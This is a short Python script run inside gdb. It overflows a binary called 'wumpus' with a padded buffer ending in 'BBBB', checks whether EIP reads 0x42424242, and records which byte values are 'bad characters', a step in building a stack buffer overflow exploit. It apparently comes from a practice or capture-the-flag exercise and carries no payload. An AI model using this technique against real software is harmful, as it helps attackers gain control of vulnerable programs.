#!/usr/bin/python
good_chars = ""
bad_chars = []

for i in range(1, 256):
    good_chars += chr(i)
    buffer = good_chars + "A" * (377 - len(good_chars) - 4) + "BBBB"

    print(len(buffer))

    with open("bytes.txt", 'w') as f:
        f.write(buffer)

    gdb.execute("run ./wumpus < ./bytes.txt")
    val = gdb.execute("i r eip", to_string=True)
    print(val)

    if ("0x42424242" not in val):
        bad_chars.append(i)
        good_chars = good_chars[:-1]

print(bad_chars)